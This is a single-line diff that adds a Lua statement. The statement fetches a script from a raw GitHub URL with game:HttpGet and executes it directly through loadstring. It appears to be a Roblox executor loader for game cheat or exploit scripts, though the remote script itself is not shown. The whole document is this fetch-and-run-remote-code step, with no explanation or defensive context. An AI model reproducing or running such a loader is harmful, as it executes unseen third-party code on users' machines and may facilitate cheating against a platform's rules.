@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Asorapip/Heema/main/script.txt",true))()
